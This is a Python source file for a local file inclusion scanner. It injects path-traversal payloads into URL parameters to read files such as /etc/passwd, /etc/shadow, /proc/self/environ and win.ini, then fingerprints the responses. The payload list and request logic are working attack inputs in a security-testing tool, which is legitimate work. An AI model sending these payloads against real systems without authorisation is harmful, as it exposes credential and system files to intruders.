"""
LFI Scanner - Local File Inclusion detection.
"""

from __future__ import annotations

import logging
import re
import time
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests


class LFIScanner:
    """
    Local File Inclusion Scanner with fingerprint-based verification.
    """

    # ==========================================================
    # LFI FINGERPRINTS - Windows and Linux specific
    # ==========================================================

    LFI_FINGERPRINTS = {
        "win.ini": {
            "patterns": [
                r"\[fonts\]",
                r"\[extensions\]",
                r"\[mail\]",
                r"\[mci\]",
                r"mci extensions",
                r"for 16-bit app support",
            ],
            "confidence": 85,
            "os": "windows",
        },
        "boot.ini": {
            "patterns": [
                r"\[boot loader\]",
                r"timeout=",
                r"default=",
                r"\[operating systems\]",
                r"multi\(0\)disk\(0\)rdisk\(0\)partition\(1\)",
            ],
            "confidence": 90,
            "os": "windows",
        },
        "autoexec.bat": {
            "patterns": [
                r"@echo off",
                r"set path=",
                r"prompt \$p\$g",
                r"echo ",
                r"rem ",
            ],
            "confidence": 60,
            "os": "windows",
        },
        "hosts": {
            "patterns": [r"127\.0\.0\.1\s+localhost", r"::1\s+localhost", r"localhost"],
            "confidence": 95,
            "os": "both",
        },
        "passwd": {
            "patterns": [
                r"root:x:0:0",
                r"daemon:x:1:1",
                r"bin:x:2:2",
                r"sys:x:3:3",
                r"/bin/bash",
            ],
            "confidence": 95,
            "os": "linux",
        },
        "shadow": {
            "patterns": [r"root:\$", r"daemon:\*", r"bin:\*", r"sys:\*"],
            "confidence": 90,
            "os": "linux",
        },
    }

    # ==========================================================
    # LFI PAYLOADS - OS-specific
    # ==========================================================

    LFI_PAYLOADS_WINDOWS = [
        "../../../../../../windows/win.ini",
        "../../../../../../windows/system32/drivers/etc/hosts",
        "../../../../../../boot.ini",
        "../../../../../../autoexec.bat",
        "..\\..\\..\\..\\..\\windows\\win.ini",
    ]

    LFI_PAYLOADS_LINUX = [
        "../../../../../../etc/passwd",
        "../../../../../../etc/hosts",
        "../../../../../../proc/self/environ",
        "../../../../../../proc/self/cmdline",
        "../../../../../../etc/shadow",
        "../../../../../../var/log/apache2/access.log",
    ]

    def __init__(
        self,
        timeout: int = 10,
        logger: logging.Logger | None = None,
    ) -> None:
        self.timeout = timeout
        self._session = requests.Session()
        self._logger = logger or logging.getLogger(__name__)
        self.scanner_name = "lfi"

    def scan(
        self,
        url: str,
        params: dict[str, Any] | None = None,
        session: requests.Session | None = None,
    ) -> list[dict[str, Any]]:
        """Scan for LFI vulnerabilities."""
        self._logger.info(f"LFI scanning: {url}")

        if session:
            self._session = session

        findings: list[dict[str, Any]] = []

        if params is None:
            params = self._extract_params(url)

        if not params:
            self._logger.debug("No parameters found")
            return findings

        # Detect OS from response
        os_type = self._detect_os(url)
        self._logger.debug(f"Detected OS: {os_type}")

        # Select payloads based on OS
        if os_type == "windows":
            payloads = self.LFI_PAYLOADS_WINDOWS
        elif os_type == "linux":
            payloads = self.LFI_PAYLOADS_LINUX
        else:
            payloads = self.LFI_PAYLOADS_WINDOWS + self.LFI_PAYLOADS_LINUX

        for param_name in params:
            for payload in payloads:
                try:
                    result = self._test_lfi(url, param_name, payload, os_type)
                    if result:
                        findings.append(result)
                except Exception as e:
                    self._logger.debug(f"Error testing {param_name}: {e}")
                    continue

        self._logger.info(f"LFI scan complete: {len(findings)} findings")
        return findings

    def _detect_os(self, url: str) -> str:
        """Detect target OS from response."""
        try:
            response = self._session.get(url, timeout=self.timeout)
            text = response.text.lower()

            if "windows" in text or "win.ini" in text or "xampp" in text:
                return "windows"
            elif "linux" in text or "/etc/" in text:
                return "linux"
            else:
                return "unknown"
        except Exception:
            return "unknown"

    def _test_lfi(
        self,
        url: str,
        param: str,
        payload: str,
        os_type: str,
    ) -> dict[str, Any] | None:
        """Test a single LFI payload."""
        try:
            test_url = self._inject_payload(url, param, payload)

            start_time = time.time()
            response = self._session.get(
                test_url,
                timeout=self.timeout,
                allow_redirects=True,
            )
            elapsed = time.time() - start_time

            fingerprint_matches = self._check_lfi_response(response, payload, os_type)

            if fingerprint_matches:
                # Build evidence
                evidence_list = []
                if response.text:
                    evidence_list.append(response.text[:500])

                # Add matched fingerprints
                for match in fingerprint_matches:
                    evidence_list.append(f"✅ Matched fingerprint: {match}")

                # Calculate confidence based on matches
                max_confidence = max(
                    [m.get("confidence", 0) for m in fingerprint_matches]
                )
                confidence = min(85, max_confidence + (len(fingerprint_matches) * 5))

                return {
                    "type": "LFI",
                    "vulnerability_type": "LFI",
                    "severity": "High",
                    "url": url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": evidence_list,
                    "references": [],
                    "status_code": response.status_code,
                    "response_length": len(response.text),
                    "response_time": elapsed,
                    "scanner_name": self.scanner_name,
                    "confidence": confidence,
                    "verified": False,
                    "is_false_positive": False,
                    "fingerprints": fingerprint_matches,
                }

        except requests.exceptions.Timeout:
            self._logger.debug(f"LFI timeout: {payload}")
            return None
        except Exception as e:
            self._logger.debug(f"LFI error: {e}")
            return None

        return None

    def _check_lfi_response(
        self, response: requests.Response, payload: str, os_type: str
    ) -> List[Dict[str, Any]]:
        """Check if response contains LFI fingerprints."""
        if not response or not response.text:
            return []

        text = response.text
        matched = []

        for file_name, fingerprint in self.LFI_FINGERPRINTS.items():
            # Skip OS-incompatible fingerprints
            if fingerprint["os"] != "both" and fingerprint["os"] != os_type:
                continue

            # Check if this file is being requested
            if file_name not in payload.lower():
                continue

            patterns = fingerprint["patterns"]
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    matched.append(
                        {
                            "file": file_name,
                            "pattern": pattern,
                            "confidence": fingerprint["confidence"],
                            "os": fingerprint["os"],
                        }
                    )
                    break

        return matched

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter."""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)

        query[param] = [payload]
        new_query = urlencode(query, doseq=True)

        return urlunparse(
            (
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            )
        )

    def _extract_params(self, url: str) -> list[str]:
        """Extract parameters from URL."""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        return list(query.keys())
